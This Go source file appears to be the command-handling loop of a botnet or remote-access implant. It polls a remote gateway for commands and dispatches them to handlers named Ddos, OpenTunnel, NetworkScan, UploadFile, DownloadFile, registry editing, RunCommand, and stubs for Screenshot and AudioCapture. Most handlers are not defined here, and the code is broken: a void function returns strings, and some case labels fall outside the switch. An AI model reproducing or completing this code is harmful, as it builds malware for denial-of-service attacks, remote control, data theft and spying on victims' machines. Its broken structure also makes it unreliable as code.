package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"golang.org/x/text/cases"
	"golang.org/x/text/language"
)

type CommandBase struct {
	Name string `json:"name"`
	Args interface{}
}

func getCommandName(body []byte, err error) (string, []byte) {
	log.Println(string(body[:]))
	data := CommandBase{}
	err = json.Unmarshal(body, &data)
	if err != nil {
		log.Fatal(err)
	}

	return data.Name, body
}

func camelCaseCommand(command string) string {
	words := strings.Split(command, "-")
	key := ""
	for _, word := range words {
		key += cases.Title(language.Und, cases.NoLower).String(word)
	}
	return key
}

type RunCommandParams struct {
	Command string `json:"command"`
}

func runCommand(params RunCommandParams) {

}

func SetInvalidPayload() {}

func getCommand() {

	config := loadConfig(true)

	url := config.Gateway + "/api/command"

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	name, byteBody := getCommandName(io.ReadAll(resp.Body))

	switch camelCaseCommand(name) {
	case "SetRelay":
		data := SetRelayParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			panic(err)
		}

		setRelay(data)

	case "SetPullingRate":
		data := SetPullingRateParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		setPullingRate(data)

	case "OpenTunnel":
		data := OpenTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		openTunnel(data)

	case "InstallTunnel":
		data := InstallTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		_, err := installTunnel(data)
		if err != nil {
			return "Error during the Tunnel Installation"
		}

	case "InstallIpScanner":
		data := InstallIpScannerParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		_, err := installIpScanner(data)
		if err != nil {
			return "Error during the IPv4Scanner"
		}

	case "GetSysInfo":
		data := GetSysInfoParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		getSysInfo(data)
	case "Ping":
		data := PingParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		result, err := ping(data)
		if err != nil {
			return "Error during the ping command"
		}
		fmt.Println(result)

	case "Wifi":
		data := WifiParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}
		wifi(data)
	case "Ddos":
		data := DdosParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		ddos(data)
	case "DownloadFile":
		data := DownloadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		downloadFile(data)

	case "NetworkScan":
		data := NetworkScanParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		networkScan(data)
	case "UploadFile":
		data := UploadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		uploadFile(data)
	case "GetPublicIp":
		data := GetPublicIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		getPublicIp(data)
	case "GetPrivateIp":
		data := GetPrivateIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		getPrivateIp(data)
	case "CreateRegValue":
		data := CreateRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		CreateRegValue(data)
	case "EditRegValue":
		data := EditRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		EditRegValue(data)

	case "DeleteRegValue":
		data := DeleteRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		DeleteRegValue(data)

	case "RunCommand":
		data := RunCommandParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		runCommand(data)
	}

	case "Screenshot" :
	case "AudioCapture":
		// TODO

	return "foo"
}
